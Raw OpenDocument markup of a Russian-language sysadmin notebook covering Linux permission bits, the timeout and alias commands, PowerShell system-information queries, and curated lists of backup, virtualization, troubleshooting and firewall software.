      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1"> - Установить так называемый </text:span><text:span text:style-name="T3">STIKY</text:span><text:span text:style-name="T1">-бит на директорию /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1">. Удалить файл в такой директории может только владелец данного файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1"> - Удалить </text:span><text:span text:style-name="T3">STIKY</text:span><text:span text:style-name="T1">-бит с директории /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod u+s /bin/binary_file - Установить SUID-бит на файл /bin/binary_file. </text:span><text:span text:style-name="T1">Это позволяет любому пользователю системы, запускать данный файл с правами владельца файла</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod u-s /bin/binary_file - Удалить SUID-бит с файла /bin/binary_file</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod g+s /home/public - Установить SGID-бит на директории /home/public</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod g-s /home/public - Удалить SGID-бит с директории /home/public</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> / -</text:span><text:span text:style-name="T3">perm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> - Поиск всех файлов с установленным </text:span><text:span text:style-name="T3">SUID</text:span><text:span text:style-name="T1"> битом, начиная с корня файловой системы</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">lh</text:span><text:span text:style-name="T1"> - Листинг текущего каталога с правами доступа</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отличное введение в концепции криптографии для начинающих:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Часть 1: https://sergioprado.blog/introduction-to-encryption-for-embedded-linux-developers/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Часть 2: https://sergioprado.blog/a-hands-on-approach-to-symmetric-key-encryption/</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Часть 3: https://sergioprado.blog/asymmetric-key-encryption-and-digital-signatures-in-practice/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как в Excel найти одинаковые значения?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы быстро найти повторяющиеся значения:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Выделите диапазон, в котором нужно найти повторяющиеся значения.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">2. На вкладке «Главная» выберите «Условное форматирование» → «Правило выделения ячеек» → «Повторяющиеся значения» → «ОК».</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">3. В разделе «Сортировка и фильтр» выберите «Фильтр» и установите фильтр по цвету выделения.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка софта с открытым исходным кодом для резервного копирования:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Amanda (http://www.amanda.org/) - Инструмент резервного копирования по модели клиент-сервер.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Backupninja (https://0xacab.org/liberate/backupninja)- Легкая, расширяемая мета-система резервного копирования.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">BackupPC (https://backuppc.github.io/backuppc/) - высокопроизводительная система для резервного копирования на диск.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Bareos (http://www.bareos.org/en/) - Форк инструмента резервного копирования Bacula.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Barman (http://www.pgbarman.org/) - Менеджер резервного копирования и восстановления для аварийного восстановления серверов PostgreSQL.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">BorgBackup (https://github.com/borgbackup/borg) - форк дедуплицирующей программы резервного копирования Attic, написанной на Python.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Burp (http://burp.grke.org/) - Программа резервного копирования и восстановления данных по сети.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">DREBS (https://github.com/dojo4/drebs) - Скрипт резервного копирования AWS EBS, поддерживающий стратегии.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Dar (http://dar.linux.free.fr/)- Что означает Disk ARchive, это надежная и многофункциональная программа архивирования и резервного копирования в стиле tar. (Исходный код) GPL-2.0 C++</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Duplicati (http://www.duplicati.com/)- Многочисленные бэкэнды, шифрование, web-ui и инструмент резервного копирования для нескольких ОС.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Duplicity (https://duplicity.gitlab.io/) - Шифрованное резервное копирование с эффективной пропускной способностью, использующее алгоритм rsync.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Elkarbackup (https://github.com/elkarbackup/elkarbackup) - Решение для резервного копирования на основе RSnapshot с простым веб-интерфейсом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rclone (https://rclone.org/)- программа командной строки для синхронизации файлов и каталогов с несколькими облачными системами хранения/провайдерами.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Rdiff-backup (http://www.nongnu.org/rdiff-backup/) - простое удаленное инкрементное резервное копирование всех ваших файлов.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Rsnapshot (http://rsnapshot.org/)- Утилита для создания моментальных снимков файловой системы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Shield (https://github.com/starkandwayne/shield)- подключаемая архитектура для резервного копирования и восстановления систем баз данных.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Snebu (http://www.snebu.com/)- Резервное копирование моментальных снимков с глобальной мультиклиентской дедупликацией и прозрачным сжатием.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">UrBackup (http://www.urbackup.org/) - Еще одна клиент-серверная система резервного копирования.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">ZBackup (http://zbackup.org/) - Универсальный инструмент резервного копирования с дедупликацией.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка программного обеспечения для виртуализации:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">ConVirt <text:s/>(http://www.convirture.com/products_opensource.php)- Предоставляет основные функции для централизованного управления виртуализированной средой KVM или Xen.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ganeti (http://www.ganeti.org/) - Программное средство управления кластерными виртуальными серверами, построенное на базе KVM и Xen.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">KVM (http://www.linux-kvm.org/) - инфраструктура виртуализации ядра Linux.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">OpenNebula (http://opennebula.org/) - Гибкое корпоративное облако, сделанное простым.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">OpenNode (http://opennodecloud.com/) - Создает программное обеспечение для управления инфраструктурой с открытым исходным кодом и реализует облачные системы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">oVirt (http://www.ovirt.org/)- Управление виртуальными машинами, хранилищами и виртуальными сетями.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Packer (https://www.packer.io/) - Инструмент для создания идентичных образов машин для нескольких платформ из одной исходной конфигурации.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Proxmox VE (https://www.proxmox.com/proxmox-ve) - Решение для управления виртуализацией.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">QEMU (http://www.qemu.org/) - универсальный эмулятор и виртуализатор машин.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Vagrant (https://www.vagrantup.com/) - Инструмент для создания полноценных сред разработки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">VirtualBox (https://www.virtualbox.org/) - Продукт виртуализации от корпорации Oracle.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">XCP-ng (http://www.xcp-ng.org/) - Основанная на Citrix XenServer, XCP-ng является полностью открытой платформой виртуализации.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Xen (http://www.xenproject.org/)- Монитор виртуальных машин для 32/64 битных архитектур Intel / AMD (IA 64) и PowerPC 970.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как запустить команду с ограничением по времени в Linux. Наша цель - запустить команду с именем « ping www.cyberciti.biz» с ограничением по времени в 30 секунд:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Откройте приложение терминала</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запустите команду ping , чтобы она прервалась через 30 секунд:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">timeout 30s ping www.cyberciti.biz</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Можно комбинировать команды sleep и другие оболочки:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ping www.cyberciti.biz &amp; sleep 30s; kill $!</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Давайте посмотрим все команды тайм-аута, синтаксис и примеры в операционных системах Linux. https://www.cyberciti.biz/faq/linux-run-a-command-with-a-time-limit/</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Top 5+ SQL Interview Problem:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">1. Database and SQL - https://bit.ly/3zGK6S7</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">2. SQL Query - https://bit.ly/3bGzN8r</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">3. MySQL - https://bit.ly/3bFkhtE</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">4. SQL Server - https://bit.ly/3A5qIj0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">5. PostgreSQL - https://bit.ly/3BOLLHP</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">6. Oracle - https://bit.ly/3zF2WsH</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Инструменты для поиска и устранения неисправностей:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">grml</text:span><text:span text:style-name="T1"> - загрузочный </text:span><text:span text:style-name="T3">Live</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">CD</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Debian</text:span><text:span text:style-name="T1"> с мощными инструментами </text:span><text:span text:style-name="T3">CLI</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">grml</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">org</text:span><text:span text:style-name="T1">/</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mitmproxy</text:span><text:span text:style-name="T1"> - инструмент </text:span><text:span text:style-name="T3">Python</text:span><text:span text:style-name="T1">, используемый для перехвата, просмотра и модификации сетевого трафика. Незаменим при устранении некоторых проблем </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">mitmproxy</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">org</text:span><text:span text:style-name="T1">/</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mtr</text:span><text:span text:style-name="T1"> - сетевая утилита, объединяющая </text:span><text:span text:style-name="T3">traceroute</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">ping</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">bitwizard</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">nl</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">mtr</text:span><text:span text:style-name="T1">/</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">perf</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">tools</text:span><text:span text:style-name="T1"> - инструменты анализа производительности, основанные на </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">perf</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">events</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">aka</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">perf</text:span><text:span text:style-name="T1">) и </text:span><text:span text:style-name="T3">ftrace</text:span><text:span text:style-name="T1">. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">github</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">brendangregg</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">perf</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">tools</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">wireshark</text:span><text:span text:style-name="T1"> - лучший в мире анализатор сетевых протоколов </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">wireshark</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">org</text:span><text:span text:style-name="T1">/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PowerShell скрипты для сбора информации о компьютерах: Собираем сведения о рабочих столах локального компьютера: Get-CimInstance -ClassName Win32_Desktop</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывод</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сведений</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">о</text:span><text:span text:style-name="T3"> BIOS: Get-CimInstance -ClassName Win32_BIOS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывод</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сведений</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">о</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">процессоре</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property SystemType</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">SystemType</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">----------</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">X86-based PC</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Получить</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">данные</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">поставщика</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">вычислительной</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">техники</text:span><text:span text:style-name="T3"> (OEM): Get-CimInstance -ClassName Win32_ComputerSystem</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Список</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">установленных</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">исправлений</text:span><text:span text:style-name="T3">: Get-CimInstance -ClassName Win32_QuickFixEngineering</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Перечисление сведений о версии операционной системы:</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>Select-Object -Property BuildNumber,BuildType,OSType,ServicePackMajorVersion,ServicePackMinorVersion</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Общие сведения о локальных пользователях:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Select-Object -Property NumberOfLicensedUsers, NumberOfUsers, RegisteredUser</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property *user*</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Получение доступного места на диске:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Measure-Object -Property FreeSpace,Size -Sum |</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Select-Object -Property Property,Sum</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Получение</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сведений</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">о</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сеансе</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">входа</text:span><text:span text:style-name="T3">: Get-CimInstance -ClassName Win32_LogonSession</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отобразить</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пользователя</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">вошедшего</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">определенную</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">компьютерную</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">систему</text:span><text:span text:style-name="T3">: Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Получение местного времени с компьютера: Get-CimInstance -ClassName Win32_LocalTime</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отображение</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">состояния</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">службы</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_Service |</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Select-Object -Property Status,Name,DisplayName</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-CimInstance -ClassName Win32_Service |</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Format-Table -Property Status, Name, DisplayName -AutoSize -Wrap</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">alias</text:span><text:span text:style-name="T1"> - команда, позволяющая создавать более краткие или более привычные псевдонимы для часто используемых команд. Команда </text:span><text:span text:style-name="T3">alias</text:span><text:span text:style-name="T1">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3">csh</text:span><text:span text:style-name="T1">, после чего он был перенесен в такие командные оболочки, как </text:span><text:span text:style-name="T3">bash</text:span><text:span text:style-name="T1">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3">Bourne</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">shell</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">ksh</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">bash</text:span><text:span text:style-name="T1">, и других, но не </text:span><text:span text:style-name="T3">sh</text:span><text:span text:style-name="T1">), синтаксис является следующим:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">alias</text:span><text:span text:style-name="T1"> &lt;псевдоним&gt;=&lt;команда&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В том случае, если при вызове команды должна осуществляться передача аргументов, следует использовать одинарные или двойные кавычки:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">alias</text:span><text:span text:style-name="T1"> &lt;псевдоним&gt;="&lt;команда&gt; &lt;аргумент&gt; …"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В случае же командных оболочек, основанных на </text:span><text:span text:style-name="T3">csh</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">csh</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">tcsh</text:span><text:span text:style-name="T1"> и других), кавычки не требуются:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">alias</text:span><text:span text:style-name="T1"> &lt;псевдоним&gt; &lt;команда&gt; [аргументы …]</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">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3">alias</text:span><text:span text:style-name="T1">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8"><text:span text:style-name="T1">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3">bash</text:span><text:span text:style-name="T1"> псевдонимы для отдельных пользователей чаще всего размещаются в файле конфигурации ~/.</text:span><text:span text:style-name="T3">bashrc</text:span><text:span text:style-name="T1">, а общесистемные псевдонимы - в файле конфигурации /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">profile</text:span><text:span text:style-name="T1">. В случае командной оболочки </text:span><text:span text:style-name="T3">tcsh</text:span><text:span text:style-name="T1"> аналогичными файлами конфигурации являются файлы ~/.</text:span><text:span text:style-name="T3">tcshrc</text:span><text:span text:style-name="T1"> и /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">login</text:span><text:span text:style-name="T1"> соответственно.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры: Простой псевдоним для пользователей операционной системы </text:span><text:span text:style-name="T3">DOS</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">alias</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">="</text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1">"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">А это пример более сложного псевдонима:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ alias topcom='sort ~/.bash_history | uniq -ci | sort -r | less'</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ alias mnt='mount | grep -i /dev/[h]d[a..g] | sort'</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">bak</text:span><text:span text:style-name="T1"> () { </text:span><text:span text:style-name="T3">cp</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> $1 $1.</text:span><text:span text:style-name="T3">bak</text:span><text:span text:style-name="T1"> }</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">не может быть преобразована в псевдоним из-за использования переменной "$1".</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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3">ksh</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">bash</text:span><text:span text:style-name="T1">,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3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">profile</text:span><text:span text:style-name="T1"> для командных оболочек, использующихся для входа в систему; модифицировать файл конфигурации /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bash</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">bashrc</text:span><text:span text:style-name="T1"> для командных оболочек, не использующихся для входа в систему.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Деактивация псевдонима: Используйте команду </text:span><text:span text:style-name="T3">unalias</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка фаерволлов для различных ОС:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">Linux: OpenSnitch (https://github.com/evilsocket/opensnitch); gufw (https://gufw.org/)Uncomplicated Firewall (https://en.wikipedia.org/wiki/Uncomplicated_Firewall)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Windows: SimpleWall (https://github.com/henrypp/simplewall); TinyWall (https://tinywall.pados.hu/)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">MacOS: LuLu (https://objective-see.org/products/lulu.html); Little Snitch (https://obdev.at/products/littlesnitch/index.html)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Android: NetGuard (https://play.google.com/store/apps/details?id=eu.faircode.netguard); NoRoot Firewall (https://play.google.com/store/apps/details?id=app.greyshirts.firewall); AFWall+ (https://github.com/ukanth/afwall/); RethinkDNS + Firewall (https://github.com/celzero/rethink-app)</text:span><text:span text:style-name="T3"/></text:p>
